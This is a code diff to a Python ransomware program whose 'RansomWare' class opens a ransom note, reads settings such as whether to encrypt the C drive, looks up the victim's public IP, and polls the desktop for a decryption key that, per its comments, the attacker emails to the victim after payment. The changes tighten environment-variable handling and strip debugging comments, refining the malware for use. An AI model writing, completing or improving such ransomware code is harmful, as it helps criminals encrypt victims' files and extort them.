@@ -21,11 +21,15 @@ load_dotenv()
 
 os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"
 
-PROJECT_PATH = os.getenv('PROJECT_PATH')
-ENCRYPT_C_DRIVE = os.getenv('ENCRYPT_C_DRIVE') == "True"
-ENCRYPTION_PATH = os.getenv('ENCRYPTION_PATH')
-PRIMARY_EMAIL = os.getenv('PRIMARY_EMAIL')
-SECONDARY_EMAIL = os.getenv('SECONDARY_EMAIL')
+try:
+    PROJECT_PATH = os.environ['PROJECT_PATH']
+    ENCRYPT_C_DRIVE = os.environ['ENCRYPT_C_DRIVE'] == "True"
+    ENCRYPTION_PATH = os.environ['ENCRYPTION_PATH']
+    PRIMARY_EMAIL = os.environ['PRIMARY_EMAIL']
+    SECONDARY_EMAIL = os.environ['SECONDARY_EMAIL']
+except KeyError as e:
+    print(f"Environment Variable {e} is not set.")
+    exit()
 
 PUBLIC_IP_API = 'https://api.ipify.org'
 
@@ -71,7 +75,7 @@ class RansomWare:
         """
         # Open the ransom note
         ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
-        count = 0  # Debugging/Testing
+        count = 0
         while True:
             time.sleep(0.1)
             top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
@@ -269,10 +273,10 @@ class RansomWare:
     def put_me_on_desktop(self):
         # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
         # -the files
-        print('started')  # Debugging/Testing
+        print('started')
         while True:
             try:
-                print('trying')  # Debugging/Testing
+                print('trying')
                 # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                 # -key in this file and sends it in an email to victim. They then put this on the desktop, and it will
                 # be used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASYMMETRIC KEY etc.
@@ -284,10 +288,10 @@ class RansomWare:
                     print('decrypted')
                     break
             except Exception as e:
-                print(e)  # Debugging/Testing
+                print(e)
                 pass
-            time.sleep(10)  # Debugging/Testing check for file on desktop every 10 seconds
-            print('Checking for PUT_ME_ON_DESKTOP.txt')  # Debugging/Testing
+            time.sleep(10)
+            print('Checking for PUT_ME_ON_DESKTOP.txt')
 
 
 def main():
